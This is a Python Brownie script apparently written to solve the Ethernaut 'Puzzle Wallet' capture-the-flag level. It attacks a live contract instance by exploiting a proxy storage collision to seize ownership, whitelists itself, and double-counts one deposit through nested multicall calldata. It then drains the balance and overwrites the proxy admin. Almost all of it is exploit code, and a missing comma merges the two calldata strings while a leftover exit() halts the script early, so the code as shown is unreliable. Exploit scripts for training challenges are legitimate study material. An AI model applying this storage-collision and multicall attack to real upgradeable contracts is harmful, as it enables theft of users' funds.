from brownie import Contract, PuzzleWallet, PuzzleProxy, accounts, convert, web3
from brownie.convert.datatypes import HexString

INSTANCE_ADDRESS = "0xE4330348B5ea9C9eFA05a32b391082A45eE8139a" # ethernaut level instance
ACCOUNT = 'straul'

def get_account():
    return accounts.load(ACCOUNT)


def pwn_proxy(account):
    # instantiate contracts
    puzzle = Contract.from_abi(name="PuzzleWallet", address=INSTANCE_ADDRESS, abi=PuzzleWallet.abi)
    proxy = Contract.from_abi(name="Proxy", address=INSTANCE_ADDRESS, abi=PuzzleProxy.abi)

    # call propose new admin(pending admin in proxy and owner in puzzle will have the same value)
    # because storage is shared in delegate call
    proxy.proposeNewAdmin(account.address, {'from': account})
    #
    # add account to whitelist
    puzzle.addToWhitelist(account.address, {'from': account})

    # call multicall -> [0] : deposit
    #                   [1] : multicall
    #                       [0] : deposit

    # deposit_selector = web3.keccak(text="deposit()")[:4]
    # multicall_selector = web3.keccak(text="multicall(bytes[])")[:4]

    data = [
        "0xd0e30db000000000000000000000000000000000000000000000000000000000"
        "0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000020d0e30db000000000000000000000000000000000000000000000000000000000"
    ]
    print(data)
    exit()
    puzzle.multicall(data, {'from': account, 'value': 1*10**18})

    # call execute to withdraw the contract balance
    puzzle.execute(account.address, 2 * 10**18, "", {'from': account, 'value': 0})

    # now that the balance is 0, we can call `setMaxBalance` to overwrite the admin of the proxy
    puzzle.setMaxBalance(int(account.address, 16), {'from': account})


def main():
    account = get_account()
    pwn_proxy(account)
